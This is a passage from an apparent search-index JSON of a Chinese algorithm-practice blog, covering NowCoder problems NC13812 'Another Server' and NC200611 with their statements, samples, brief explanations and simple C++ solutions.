Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 262144 kB 1.2. Problem Description # \u4f55\u8001\u5e08\u67d0\u5929\u5728\u673a\u623f\u91cc\u641e\u4e8b\u60c5\u7684\u65f6\u5019\uff0c\u53d1\u73b0\u673a\u623f\u91cc\u6709n\u53f0\u670d\u52a1\u5668\uff0c\u4ece 1 \u5230 n \u6807\u53f7\uff0c\u540c\u65f6\u6709 2n-2 \u6761\u7f51\u7ebf\uff0c\u4ece 1 \u5230 2n-2 \u6807\u53f7\uff0c\u5176\u4e2d\u7b2ci\u6761\u7f51\u7ebf\u53cc\u5411\u8fde\u63a5\u7740 \u670d\u52a1\u5668\u548c\u53f7\u670d\u52a1\u5668\uff0c\u5728\u4e00\u4e2a\u5355\u4f4d\u65f6\u95f4\u5185\u6700\u591a\u80fd\u591f\u627f\u53d7 x_i \u4e2a\u5355\u4f4d\u6d41\u91cf\u3002 \u663e\u7136\u8fd9\u4e9b\u670d\u52a1\u5668\u4e4b\u95f4\u8981\u8fdb\u884c\u4fe1\u606f\u4ea4\u6362\uff0c\u4e3a\u4e86\u6d4b\u8bd5\u670d\u52a1\u5668\u7684\u6297\u538b\u80fd\u529b\uff0c\u4f60\u9700\u8981\u5e2e\u4f55\u8001\u5e08\u8ba1\u7b97\u51fa 1 \u53f7\u670d\u52a1\u5668\u5728\u4e00\u4e2a\u5355\u4f4d\u65f6\u95f4\u5185\u6700\u591a\u80fd\u5411 n \u53f7\u670d\u52a1\u5668\u53d1\u9001\u591a\u5c11\u4e2a\u5355\u4f4d\u6d41\u91cf\u7684\u6570\u636e\uff0c\u8fd9\u91cc\u8ba4\u4e3a\u6570\u636e\u7684\u4f20\u8f93\u662f\u77ac\u95f4\u5b8c\u6210\u7684\u3002 1.3. Input # \u7b2c\u4e00\u884c\u662f\u4e00\u4e2a\u6b63\u6574\u6570 T(\\le 1000) \uff0c\u8868\u793a\u6d4b\u8bd5\u6570\u636e\u7684\u7ec4\u6570\uff0c \u5bf9\u4e8e\u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\uff0c \u7b2c\u4e00\u884c\u662f\u4e00\u4e2a\u6574\u6570 n(2 \\le n \\le 100) \uff0c\u8868\u793a\u670d\u52a1\u5668\u7684\u6570\u91cf\uff0c \u7b2c\u4e8c\u884c\u5305\u542b2n-2\u4e2a\u4ee5\u7a7a\u683c\u5206\u9694\u7684\u6b63\u6574\u6570 x_1,x_2,...,x_{2n-2} \uff0c\u8868\u793a\u7f51\u7ebf\u5355\u4f4d\u65f6\u95f4\u5185\u80fd\u627f\u53d7\u7684\u6d41\u91cf\uff0c\u4fdd\u8bc1\u4e0d\u8d85\u8fc7100\u3002 1.4. Output # \u5bf9\u4e8e\u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\uff0c\u8f93\u51fa\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a 1 \u53f7\u670d\u52a1\u5668\u5728\u4e00\u4e2a\u5355\u4f4d\u65f6\u95f4\u5185\u6700\u591a\u80fd\u5411 n \u53f7\u670d\u52a1\u5668\u53d1\u9001\u7684\u6570\u636e\u91cf\u3002 1.5. Sample Input # 2 2 1 1 3 1 3 2 4 1.6. Sample Output # 2 4 1.7. Source # \u725b\u5ba2\u7f51 NC13812 Another Server 2. \u89e3\u8bfb # \u6c42\u6bcf\u4e24\u6839\u7ebf\u80fd\u91cf\u4e4b\u548c\u7684\u6700\u5c0f\u503c\uff0c\u5373\u5bf9 2n \u548c 2n-1 \u4e24\u9879\u8fdb\u884c\u6c42\u548c sum_n \uff0c\u6c42\u6700\u5c0f\u503c \\min sum_n 3. \u4ee3\u7801 # #include <iostream> #include <string.h> using namespace std; const int NUM = 1e3 + 1; // \u5b58\u50a8 long long list[NUM]; int main() { // test case int t, n; scanf(\"%d\", &t); // \u6bcf\u4e24\u6839\u7ebf\u80fd\u91cf\u4e4b\u548c\u7684\u6700\u5c0f\u503c long long minSum; // test case for (int i = 0; i < t; i++) { // \u673a\u5668\u6570\u91cf scanf(\"%d\", &n); // \u521d\u59cb\u5316 memset(list, 0, sizeof(list)); // \u8f93\u5165 for (int j = 0; j < 2 * n - 2; j++) { scanf(\"%lld\", &list[j]); } // \u8ba1\u7b97 // \u521d\u59cb\u5316 minSum = list[0] + list[1]; // \u6c42\u6bcf\u4e24\u6839\u7ebf\u80fd\u91cf\u4e4b\u548c\u7684\u6700\u5c0f\u503c for (int i = 1; i < n - 1; i++) { minSum = min(minSum, list[2 * i] + list[2 * i + 1]); } // \u8f93\u51fa printf(\"%lld\\n\", minSum); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"6.\u725b\u5ba2\u7f51 NC13812 Another Server"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/6.%E7%89%9B%E5%AE%A2%E7%BD%91_NC13812_Another_Server/#nc13812-another-server","text":"","title":"\u725b\u5ba2\u7f51 NC13812 Another Server"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/6.%E7%89%9B%E5%AE%A2%E7%BD%91_NC13812_Another_Server/#_1","text":"\u725b\u5ba2\u7f51 NC13812 Another Server \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/6.%E7%89%9B%E5%AE%A2%E7%BD%91_NC13812_Another_Server/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/6.%E7%89%9B%E5%AE%A2%E7%BD%91_NC13812_Another_Server/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 262144 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/6.%E7%89%9B%E5%AE%A2%E7%BD%91_NC13812_Another_Server/#12-problem-description","text":"\u4f55\u8001\u5e08\u67d0\u5929\u5728\u673a\u623f\u91cc\u641e\u4e8b\u60c5\u7684\u65f6\u5019\uff0c\u53d1\u73b0\u673a\u623f\u91cc\u6709n\u53f0\u670d\u52a1\u5668\uff0c\u4ece 1 \u5230 n \u6807\u53f7\uff0c\u540c\u65f6\u6709 2n-2 \u6761\u7f51\u7ebf\uff0c\u4ece 1 \u5230 2n-2 \u6807\u53f7\uff0c\u5176\u4e2d\u7b2ci\u6761\u7f51\u7ebf\u53cc\u5411\u8fde\u63a5\u7740 \u670d\u52a1\u5668\u548c\u53f7\u670d\u52a1\u5668\uff0c\u5728\u4e00\u4e2a\u5355\u4f4d\u65f6\u95f4\u5185\u6700\u591a\u80fd\u591f\u627f\u53d7 x_i \u4e2a\u5355\u4f4d\u6d41\u91cf\u3002 \u663e\u7136\u8fd9\u4e9b\u670d\u52a1\u5668\u4e4b\u95f4\u8981\u8fdb\u884c\u4fe1\u606f\u4ea4\u6362\uff0c\u4e3a\u4e86\u6d4b\u8bd5\u670d\u52a1\u5668\u7684\u6297\u538b\u80fd\u529b\uff0c\u4f60\u9700\u8981\u5e2e\u4f55\u8001\u5e08\u8ba1\u7b97\u51fa 1 \u53f7\u670d\u52a1\u5668\u5728\u4e00\u4e2a\u5355\u4f4d\u65f6\u95f4\u5185\u6700\u591a\u80fd\u5411 n \u53f7\u670d\u52a1\u5668\u53d1\u9001\u591a\u5c11\u4e2a\u5355\u4f4d\u6d41\u91cf\u7684\u6570\u636e\uff0c\u8fd9\u91cc\u8ba4\u4e3a\u6570\u636e\u7684\u4f20\u8f93\u662f\u77ac\u95f4\u5b8c\u6210\u7684\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/6.%E7%89%9B%E5%AE%A2%E7%BD%91_NC13812_Another_Server/#13-input","text":"\u7b2c\u4e00\u884c\u662f\u4e00\u4e2a\u6b63\u6574\u6570 T(\\le 1000) \uff0c\u8868\u793a\u6d4b\u8bd5\u6570\u636e\u7684\u7ec4\u6570\uff0c \u5bf9\u4e8e\u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\uff0c \u7b2c\u4e00\u884c\u662f\u4e00\u4e2a\u6574\u6570 n(2 \\le n \\le 100) \uff0c\u8868\u793a\u670d\u52a1\u5668\u7684\u6570\u91cf\uff0c \u7b2c\u4e8c\u884c\u5305\u542b2n-2\u4e2a\u4ee5\u7a7a\u683c\u5206\u9694\u7684\u6b63\u6574\u6570 x_1,x_2,...,x_{2n-2} \uff0c\u8868\u793a\u7f51\u7ebf\u5355\u4f4d\u65f6\u95f4\u5185\u80fd\u627f\u53d7\u7684\u6d41\u91cf\uff0c\u4fdd\u8bc1\u4e0d\u8d85\u8fc7100\u3002","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/6.%E7%89%9B%E5%AE%A2%E7%BD%91_NC13812_Another_Server/#14-output","text":"\u5bf9\u4e8e\u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\uff0c\u8f93\u51fa\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a 1 \u53f7\u670d\u52a1\u5668\u5728\u4e00\u4e2a\u5355\u4f4d\u65f6\u95f4\u5185\u6700\u591a\u80fd\u5411 n \u53f7\u670d\u52a1\u5668\u53d1\u9001\u7684\u6570\u636e\u91cf\u3002","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/6.%E7%89%9B%E5%AE%A2%E7%BD%91_NC13812_Another_Server/#15-sample-input","text":"2 2 1 1 3 1 3 2 4","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/6.%E7%89%9B%E5%AE%A2%E7%BD%91_NC13812_Another_Server/#16-sample-output","text":"2 4","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/6.%E7%89%9B%E5%AE%A2%E7%BD%91_NC13812_Another_Server/#17-source","text":"\u725b\u5ba2\u7f51 NC13812 Another Server","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/6.%E7%89%9B%E5%AE%A2%E7%BD%91_NC13812_Another_Server/#2","text":"\u6c42\u6bcf\u4e24\u6839\u7ebf\u80fd\u91cf\u4e4b\u548c\u7684\u6700\u5c0f\u503c\uff0c\u5373\u5bf9 2n \u548c 2n-1 \u4e24\u9879\u8fdb\u884c\u6c42\u548c sum_n \uff0c\u6c42\u6700\u5c0f\u503c \\min sum_n","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/6.%E7%89%9B%E5%AE%A2%E7%BD%91_NC13812_Another_Server/#3","text":"#include <iostream> #include <string.h> using namespace std; const int NUM = 1e3 + 1; // \u5b58\u50a8 long long list[NUM]; int main() { // test case int t, n; scanf(\"%d\", &t); // \u6bcf\u4e24\u6839\u7ebf\u80fd\u91cf\u4e4b\u548c\u7684\u6700\u5c0f\u503c long long minSum; // test case for (int i = 0; i < t; i++) { // \u673a\u5668\u6570\u91cf scanf(\"%d\", &n); // \u521d\u59cb\u5316 memset(list, 0, sizeof(list)); // \u8f93\u5165 for (int j = 0; j < 2 * n - 2; j++) { scanf(\"%lld\", &list[j]); } // \u8ba1\u7b97 // \u521d\u59cb\u5316 minSum = list[0] + list[1]; // \u6c42\u6bcf\u4e24\u6839\u7ebf\u80fd\u91cf\u4e4b\u548c\u7684\u6700\u5c0f\u503c for (int i = 1; i < n - 1; i++) { minSum = min(minSum, list[2 * i] + list[2 * i + 1]); } // \u8f93\u51fa printf(\"%lld\\n\", minSum); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200611_F-%E5%8F%82%E8%B5%9B/","text":"\u725b\u5ba2\u7f51 NC200611 F-\u53c2\u8d5b # \u76ee\u5f55 # \u725b\u5ba2\u7f51 NC200611 F-\u53c2\u8d5b \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 1.8. Notes 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 262144 kB 1.2. Problem Description # jx\u961f\u957f\u534a\u591c@\u5c0f\u80d6\uff1a\u4f60\u5feb\u51fa\u4e00\u9053\u7b7e\u5230\u9898\u5440\uff0c\u7b80\u5355\u70b9\u7684\uff0c\u4e0d\u884c\u6253\u4f60\u554a\u3002\u5c0f\u80d6\u5413\u5f97\u8d76\u7d27\u4e0b\u5e8a\u60f3\u9898\uff0c\u8fb9\u60f3\u8fb9\u548cjx\u961f\u957f\u5439\u6c34\uff0c\u60f3\u8d77\u4e86\u53c2\u52a0acm\u7684\u79cd\u79cd\u7ecf\u5386\u3002\u6709\u611f\u800c\u53d1\u548cjx\u961f\u957f\u8bf4\u4e86\u60f3\u6cd5\u4e4b\u540e\uff0cjx\u961f\u957f\uff1a\u4f60\u8fd9\u4ec0\u4e48\u9898\u610f\uff0c\u4e0d\u884c\u554a\u592a\u96be\u4e86\uff0c\u6211\u6765\u6539\u3002\u4e00\u987f\u4e89\u8fa9\u4e4b\u540e\u5c0f\u80d6\u6298\u670d\u4e86\uff0c\u5185\u5fc3\uff1ajx\u961f\u957f\u725b\u903c\u3002jx\u961f\u957f\uff1a\u7761\u5427\u7761\u5427\uff0c\u627e\u65f6\u95f4\u8bf7\u4f60\u559d\u5976\u8336\u3002 \u4f17\u6240\u5468\u77e5\uff1aicpc\u8d5b\u5236\u4e2d\uff0c\u4e00\u652f\u961f\u4f0d\u7531\u4e09\u4e2a\u961f\u5458\u548c\u4e00\u4e2a\u6559\u7ec3\u7ec4\u6210\uff0c\u4e00\u4e2a\u6559\u7ec3\u53ef\u4ee5\u517c\u4efb\u591a\u4e2a\u961f\u4f0d\u7684\u6559\u7ec3\uff1b\u5929\u68af\u8d5b\u8d5b\u5236\u4e2d\uff0c\u4e00\u652f\u961f\u4f0d\u7531\u5341\u4e2a\u961f\u5458\u7ec4\u961f\u548c\u4e00\u4e2a\u6559\u7ec3\u7ec4\u6210\uff0c\u4e00\u4e2a\u6559\u7ec3\u53ef\u4ee5\u517c\u4efb\u591a\u4e2a\u961f\u4f0d\u7684\u6559\u7ec3\uff1b\u540c\u65f6\uff0c\u4e00\u4e2a\u961f\u5458\u53ef\u4ee5\u540c\u65f6\u53c2\u4e0e\u4e24\u79cd\u6bd4\u8d5b\uff0c\u4f46\u4e0d\u80fd\u540c\u65f6\u53c2\u4e0e\u540c\u4e00\u6bd4\u8d5b\u7684\u4e0d\u540c\u961f\u4f0d\u3002 \u5982\u679c\u53c2\u8d5b\u961f\u7684Q\u7fa4\u91cc\u6559\u7ec3\u548c\u961f\u5458\u7684\u4eba\u6570\u5171\u6709 n \u4eba\uff0c\u53c2\u8d5b\u961f\u662f\u5426\u521a\u597d\u6240\u6709\u4eba\u90fd\u80fd\u540c\u65f6\u7ec4\u6210\u961f\u4f0d\u53c2\u8d5b\uff1f 1.3. Input # \u591a\u6d4b\u8bd5\u7528\u4f8b \u6bcf\u7ec4\u6d4b\u8bd5\u7528\u4f8b\u4e00\u884c\uff0c\u5305\u62ec\u4e00\u4e2a\u6574\u6570 n\uff081 \\le n \\le 300\uff09 \uff0c\u8868\u793a\u7fa4\u5185\u7684\u4eba\u6570\u6709 n \u4eba 1.4. Output # \u5bf9\u4e8e\u6bcf\u7ec4\u6d4b\u8bd5\u7528\u4f8b \u5982\u679c\u6240\u6709\u4eba\u90fd\u80fd\u540c\u65f6\u53c2\u52a0\u4e24\u79cd\u6bd4\u8d5b\uff0c\u8bf7\u8f93\u51fa All \uff1b \u5982\u679c\u6240\u6709\u4eba\u90fd\u80fd\u540c\u65f6\u53c2\u52a0icpc\u4f46\u4e0d\u80fd\u540c\u65f6\u53c2\u52a0\u5929\u68af\u8d5b\uff0c\u8bf7\u8f93\u51fa First \uff1b \u5982\u679c\u6240\u6709\u4eba\u90fd\u80fd\u540c\u65f6\u53c2\u52a0\u5929\u68af\u8d5b\u4e0d\u80fd\u540c\u65f6\u53c2\u52a0icpc\uff0c\u8bf7\u8f93\u51fa Second \uff1b \u5426\u5219\u8bf7\u8f93\u51fa No \u3002 1.5. Sample Input # 11 7 9 10 100 1.6. Sample Output # All First No First First 1.7. Source # \u725b\u5ba2\u7f51 NC200611 F-\u53c2\u8d5b 1.8. Notes # 11\u53ef\u4ee5\u5206\u4e3a \u4e00\u652f\u5929\u68af\u8d5b\u7684\u961f\u4f0d\u548c\u4e00\u4e2a\u6559\u7ec3 \u6216\u8005 \u4e09\u652ficpc\u7684\u961f\u4f0d\u548c\u4e24\u4e2a\u6559\u7ec3\uff0c\u6240\u4ee5\u8f93\u51fa All \u3002 7\u53ea\u80fd\u5206\u4e3a \u4e24\u652ficpc\u7684\u961f\u4f0d\u548c\u4e00\u4e2a\u6559\u7ec3\uff0c\u6240\u4ee5\u8f93\u51fa First \u3002 2. \u89e3\u8bfb # \u5982\u679c 0 < n \\% 10 \\le \\lfloor n / 10\\rfloor \uff0c\u53ef\u4ee5\u53c2\u52a0\u5929\u68af\u8d5b\uff0c\u5982\u679c 0 < n \\% 10 \\le \\lfloor n / 10\\rfloor \uff0c\u53ef\u4ee5\u53c2\u52a0icpc\u3002 \u8fd8\u6709\u4e00\u79cd\u60c5\u51b5\u662f n \\% 10 == 0 \u4e14 \\lfloor (n - 1) / 10\\rfloor \\ge 10 \uff0c\u8fd9\u79cd\u60c5\u51b5\u53ef\u4ee5\u7ed3\u5408\u4e0a\u4e00\u6761\u89c4\u5219\uff0c\u7b80\u5316\u4e3a n >= 110 \uff0c\u53ef\u4ee5\u53c2\u52a0\u5929\u68af\u8d5b \u5bf9 3 \u4e5f\u662f\u7c7b\u4f3c\u7684\uff0c n \\ge 12 \uff0c\u53ef\u4ee5\u53c2\u52a0icpc\u3002 3. \u4ee3\u7801 # #include <algorithm> #include <iostream> #include <math.h> const long long num = 1e6 + 1; using namespace std; long long list[num]; int main() { long long n, m; string ans; long long sum = 0; long long num10, buffer10; long long num3, buffer3; bool mark10, mark3; // \u8ba1\u7b97 while (scanf(\"%lld\", &n) != EOF) { num10 = floor(n / 10); num3 = floor(n / 3); buffer10 = n % 10; buffer3 = n % 3; if ((buffer10 <= num10 && buffer10 > 0) || n >= 110) { mark10 = true; } else { mark10 = false; } if ((buffer3 <= num3 && buffer3 > 0) || n >= 12) { mark3 = true; } else { mark3 = false; } if (mark10 && mark3) { ans = \"All\"; } else if (mark10) { ans = \"Second\"; } else if (mark3) { ans = \"First\"; } else { ans = \"No\"; } printf(\"%s\\n\", ans.c_str()); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"7.\u725b\u5ba2\u7f51 NC200611 F \u53c2\u8d5b"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200611_F-%E5%8F%82%E8%B5%9B/#nc200611-f-","text":"","title":"\u725b\u5ba2\u7f51 NC200611 F-\u53c2\u8d5b"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200611_F-%E5%8F%82%E8%B5%9B/#_1","text":"\u725b\u5ba2\u7f51 NC200611 F-\u53c2\u8d5b \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 1.8. Notes 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200611_F-%E5%8F%82%E8%B5%9B/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200611_F-%E5%8F%82%E8%B5%9B/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 262144 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200611_F-%E5%8F%82%E8%B5%9B/#12-problem-description","text":"jx\u961f\u957f\u534a\u591c@\u5c0f\u80d6\uff1a\u4f60\u5feb\u51fa\u4e00\u9053\u7b7e\u5230\u9898\u5440\uff0c\u7b80\u5355\u70b9\u7684\uff0c\u4e0d\u884c\u6253\u4f60\u554a\u3002\u5c0f\u80d6\u5413\u5f97\u8d76\u7d27\u4e0b\u5e8a\u60f3\u9898\uff0c\u8fb9\u60f3\u8fb9\u548cjx\u961f\u957f\u5439\u6c34\uff0c\u60f3\u8d77\u4e86\u53c2\u52a0acm\u7684\u79cd\u79cd\u7ecf\u5386\u3002\u6709\u611f\u800c\u53d1\u548cjx\u961f\u957f\u8bf4\u4e86\u60f3\u6cd5\u4e4b\u540e\uff0cjx\u961f\u957f\uff1a\u4f60\u8fd9\u4ec0\u4e48\u9898\u610f\uff0c\u4e0d\u884c\u554a\u592a\u96be\u4e86\uff0c\u6211\u6765\u6539\u3002\u4e00\u987f\u4e89\u8fa9\u4e4b\u540e\u5c0f\u80d6\u6298\u670d\u4e86\uff0c\u5185\u5fc3\uff1ajx\u961f\u957f\u725b\u903c\u3002jx\u961f\u957f\uff1a\u7761\u5427\u7761\u5427\uff0c\u627e\u65f6\u95f4\u8bf7\u4f60\u559d\u5976\u8336\u3002 \u4f17\u6240\u5468\u77e5\uff1aicpc\u8d5b\u5236\u4e2d\uff0c\u4e00\u652f\u961f\u4f0d\u7531\u4e09\u4e2a\u961f\u5458\u548c\u4e00\u4e2a\u6559\u7ec3\u7ec4\u6210\uff0c\u4e00\u4e2a\u6559\u7ec3\u53ef\u4ee5\u517c\u4efb\u591a\u4e2a\u961f\u4f0d\u7684\u6559\u7ec3\uff1b\u5929\u68af\u8d5b\u8d5b\u5236\u4e2d\uff0c\u4e00\u652f\u961f\u4f0d\u7531\u5341\u4e2a\u961f\u5458\u7ec4\u961f\u548c\u4e00\u4e2a\u6559\u7ec3\u7ec4\u6210\uff0c\u4e00\u4e2a\u6559\u7ec3\u53ef\u4ee5\u517c\u4efb\u591a\u4e2a\u961f\u4f0d\u7684\u6559\u7ec3\uff1b\u540c\u65f6\uff0c\u4e00\u4e2a\u961f\u5458\u53ef\u4ee5\u540c\u65f6\u53c2\u4e0e\u4e24\u79cd\u6bd4\u8d5b\uff0c\u4f46\u4e0d\u80fd\u540c\u65f6\u53c2\u4e0e\u540c\u4e00\u6bd4\u8d5b\u7684\u4e0d\u540c\u961f\u4f0d\u3002 \u5982\u679c\u53c2\u8d5b\u961f\u7684Q\u7fa4\u91cc\u6559\u7ec3\u548c\u961f\u5458\u7684\u4eba\u6570\u5171\u6709 n \u4eba\uff0c\u53c2\u8d5b\u961f\u662f\u5426\u521a\u597d\u6240\u6709\u4eba\u90fd\u80fd\u540c\u65f6\u7ec4\u6210\u961f\u4f0d\u53c2\u8d5b\uff1f","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200611_F-%E5%8F%82%E8%B5%9B/#13-input","text":"\u591a\u6d4b\u8bd5\u7528\u4f8b \u6bcf\u7ec4\u6d4b\u8bd5\u7528\u4f8b\u4e00\u884c\uff0c\u5305\u62ec\u4e00\u4e2a\u6574\u6570 n\uff081 \\le n \\le 300\uff09 \uff0c\u8868\u793a\u7fa4\u5185\u7684\u4eba\u6570\u6709 n \u4eba","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200611_F-%E5%8F%82%E8%B5%9B/#14-output","text":"\u5bf9\u4e8e\u6bcf\u7ec4\u6d4b\u8bd5\u7528\u4f8b \u5982\u679c\u6240\u6709\u4eba\u90fd\u80fd\u540c\u65f6\u53c2\u52a0\u4e24\u79cd\u6bd4\u8d5b\uff0c\u8bf7\u8f93\u51fa All \uff1b \u5982\u679c\u6240\u6709\u4eba\u90fd\u80fd\u540c\u65f6\u53c2\u52a0icpc\u4f46\u4e0d\u80fd\u540c\u65f6\u53c2\u52a0\u5929\u68af\u8d5b\uff0c\u8bf7\u8f93\u51fa First \uff1b \u5982\u679c\u6240\u6709\u4eba\u90fd\u80fd\u540c\u65f6\u53c2\u52a0\u5929\u68af\u8d5b\u4e0d\u80fd\u540c\u65f6\u53c2\u52a0icpc\uff0c\u8bf7\u8f93\u51fa Second \uff1b \u5426\u5219\u8bf7\u8f93\u51fa No \u3002","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200611_F-%E5%8F%82%E8%B5%9B/#15-sample-input","text":"11 7 9 10 100","title":"1.5. Sample 